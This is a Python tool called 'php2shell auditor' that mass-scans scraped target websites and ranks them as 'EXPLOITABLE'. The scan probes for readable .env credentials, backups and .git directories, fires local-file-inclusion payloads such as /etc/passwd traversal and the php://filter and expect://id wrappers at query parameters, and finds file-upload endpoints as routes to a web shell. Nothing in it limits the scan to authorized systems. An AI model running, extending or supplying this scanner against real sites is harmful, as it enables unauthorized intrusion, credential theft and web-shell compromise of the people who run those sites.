#!/usr/bin/env python3
"""
php2shell — Vulnerability Auditor
Audits scraped targets for php2shell attack vectors:
  - outdated/EOL PHP versions
  - LFI/RFI (local/remote file inclusion)
  - exposed upload endpoints
  - known CMS paths + version fingerprint
  - admin panel exposure
Output: audit_report.json with per-target vectors + exploitability score
"""
import json
import re
import argparse
import concurrent.futures as cf
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

import requests

requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# PHP EOL versions — anything here is unpatched by definition
PHP_EOL = {
    (5, 0): "2005-09-05", (5, 1): "2006-08-24", (5, 2): "2011-01-06",
    (5, 3): "2014-08-14", (5, 4): "2015-09-03", (5, 5): "2016-07-21",
    (5, 6): "2017-01-19", (7, 0): "2018-12-01", (7, 1): "2019-12-01",
    (7, 2): "2020-11-30", (7, 3): "2021-12-06", (7, 4): "2022-11-28",
    (8, 0): "2023-11-26", (8, 1): "2025-12-31",
}

# Common upload endpoints across CMS + custom apps
UPLOAD_PATHS = [
    "upload.php", "fileupload.php", "uploadfile.php", "do_upload.php",
    "admin/upload.php", "wp-admin/admin-ajax.php",
    "administrator/index.php?option=com_media&view=media",
    "index.php?option=com_jce&action=upload",
    "modules/upload.php", "includes/upload.php",
    "assets/upload.php", "api/upload", "upload",
    "filemanager/upload.php", "elfinder/elfinder.php",
    "ckeditor/plugins/imgupload/imgupload.php",
    "tiny_mce/plugins/tinybrowser/upload.php",
    "admin.php?mod=upload", "?page=upload",
]

# LFI/RFI-prone param names
LFI_PARAMS = ["page", "file", "include", "path", "doc", "cont", "lang", "mod", "cat", "inc", "read", "view", "template", "pg"]

# Known CMS/vuln paths (version disclosure or known-exploitable)
CMS_PATHS = {
    "wordpress": ["wp-login.php", "wp-admin/", "xmlrpc.php", "wp-config.php.bak", "wp-content/debug.log"],
    "joomla": ["administrator/", "configuration.php.bak", "README.txt"],
    "drupal": ["CHANGELOG.txt", "core/CHANGELOG.txt", "sites/default/settings.php.bak"],
    "laravel": [".env", ".env.bak", "storage/logs/laravel.log"],
    "symfony": ["app_dev.php", "config.php"],
    "generic": ["phpinfo.php", "info.php", "test.php", "backup.zip", "db.sql", ".git/config"],
}

# LFI payloads — /etc/passwd traversal + php filter wrappers
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "expect://id",
    "data://text/plain;base64,cGhwaW5mbygpOw==",
]

PASSWD_MARKER = re.compile(r"root:.*:0:0:")
PHPINFO_MARKER = re.compile(r"phpinfo\(\)|PHP Version [\d.]+", re.I)
ENV_MARKER = re.compile(r"DB_PASSWORD|APP_KEY|MYSQL_", re.I)


class Auditor:
    def __init__(self, timeout=12, threads=15):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": UA})

    def _get(self, url, **kw):
        kw.setdefault("timeout", self.timeout)
        return self.session.get(url, **kw)

    # ---------- fingerprint ----------
    def deep_fingerprint(self, target):
        """Extended fingerprint: version, EOL status, CMS, sensitive files."""
        url = target["url"]
        info = dict(target)
        vulns = []

        # sensitive file probes
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}/"
        for cms, paths in CMS_PATHS.items():
            for p in paths:
                probe = urljoin(base, p)
                try:
                    r = self._get(probe, allow_redirects=False)
                    if r.status_code == 200 and len(r.text) > 0:
                        if p.endswith(".env") and ENV_MARKER.search(r.text):
                            vulns.append({"type": "exposed_env", "url": probe, "severity": "critical",
                                          "detail": ".env with credentials readable"})
                        elif "debug.log" in p and "stack" in r.text.lower():
                            vulns.append({"type": "exposed_log", "url": probe, "severity": "high",
                                          "detail": "debug log leaks stack traces"})
                        elif p == ".git/config":
                            vulns.append({"type": "exposed_git", "url": probe, "severity": "high",
                                          "detail": ".git repo exposed — source disclosure"})
                        elif "phpinfo" in p and PHPINFO_MARKER.search(r.text):
                            vulns.append({"type": "phpinfo", "url": probe, "severity": "medium",
                                          "detail": "phpinfo() exposed"})
                        elif p.endswith((".sql", ".zip")):
                            vulns.append({"type": "exposed_backup", "url": probe, "severity": "critical",
                                          "detail": f"backup file {p} downloadable"})
                        elif "CHANGELOG" in p or "README" in p:
                            m = re.search(r"(\d+\.\d+\.\d+)", r.text[:2000])
                            if m:
                                info["cms_version"] = m.group(1)
                except Exception:
                    pass

        # PHP version EOL check
        ver = info.get("php_version")
        if ver:
            try:
                mm = tuple(int(x) for x in ver.split(".")[:2])
                if mm in PHP_EOL:
                    vulns.append({"type": "php_eol", "version": ver, "eol_date": PHP_EOL[mm],
                                  "severity": "high", "detail": f"PHP {ver} EOL since {PHP_EOL[mm]} — unpatched"})
            except Exception:
                pass

        info["vulns"] = vulns
        return info

    # ---------- LFI / RFI ----------
    def test_lfi(self, target):
        """Probe query params for local file inclusion."""
        url = target["url"]
        found = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # test existing params
        test_params = list(params.keys()) if params else LFI_PARAMS[:5]
        for param in test_params:
            for payload in LFI_PAYLOADS:
                test_q = urlencode({**params, param: payload})
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_q}"
                try:
                    r = self._get(test_url)
                    body = r.text
                    if PASSWD_MARKER.search(body):
                        found.append({"type": "lfi", "url": test_url, "param": param,
                                      "payload": payload, "severity": "critical",
                                      "detail": "/etc/passwd disclosed — LFI confirmed"})
                        break
                    if "PHP Version" in body and "phpinfo" in body.lower():
                        found.append({"type": "lfi_phpinfo", "url": test_url, "param": param,
                                      "severity": "high", "detail": "phpinfo via LFI"})
                        break
                    if "uid=" in body and "gid=" in body:
                        found.append({"type": "rce_lfi", "url": test_url, "param": param,
                                      "payload": payload, "severity": "critical",
                                      "detail": "command execution via expect:// wrapper"})
                        break
                except Exception:
                    continue
        return found

    # ---------- upload endpoints ----------
    def scan_uploads(self, target):
        """Discover reachable upload endpoints."""
        url = target["url"]
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}/"
        found = []
        for path in UPLOAD_PATHS:
            probe = urljoin(base, path)
            try:
                r = self._get(probe, allow_redirects=True)
                if r.status_code == 200 and (
                    "upload" in r.text.lower()[:5000]
                    or 'type="file"' in r.text
                    or "multipart/form-data" in r.text
                ):
                    found.append({"type": "upload_endpoint", "url": probe,
                                  "severity": "medium",
                                  "detail": f"upload form at {path} (HTTP 200)"})
            except Exception:
                pass
        return found

    # ---------- orchestration ----------
    def audit_target(self, target):
        info = self.deep_fingerprint(target)
        vulns = list(info.get("vulns", []))

        vulns.extend(self.test_lfi(info))
        vulns.extend(self.scan_uploads(info))

        info["vulns"] = vulns
        # exploitability score
        score = 0
        for v in vulns:
            score += {"critical": 50, "high": 30, "medium": 15}.get(v["severity"], 5)
        info["exploitability"] = score
        info["verdict"] = "EXPLOITABLE" if score >= 50 else ("PROMISING" if score >= 30 else "LOW")
        return info

    def run(self, targets):
        print(f"[*] auditing {len(targets)} targets...")
        results = []
        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self.audit_target, t): t["url"] for t in targets}
            for fut in cf.as_completed(futs):
                try:
                    results.append(fut.result())
                except Exception as e:
                    print(f"[!] audit error: {e}")
        results.sort(key=lambda x: -x["exploitability"])
        return results


def main():
    ap = argparse.ArgumentParser(description="php2shell auditor")
    ap.add_argument("-i", "--input", default="targets.json")
    ap.add_argument("-o", "--output", default="audit_report.json")
    ap.add_argument("--threads", type=int, default=15)
    args = ap.parse_args()

    targets = json.loads(Path(args.input).read_text())
    auditor = Auditor(threads=args.threads)
    report = auditor.run(targets)

    Path(args.output).write_text(json.dumps(report, indent=2))
    exploitable = [r for r in report if r["verdict"] == "EXPLOITABLE"]
    print(f"[+] {len(report)} audited → {args.output}")
    print(f"[+] {len(exploitable)} EXPLOITABLE targets:")
    for r in exploitable[:20]:
        print(f"  [{r['exploitability']:>3}] {r['url']}")
        for v in r["vulns"]:
            print(f"        - {v['severity']:<8} {v['type']}: {v['detail']}")


if __name__ == "__main__":
    main()
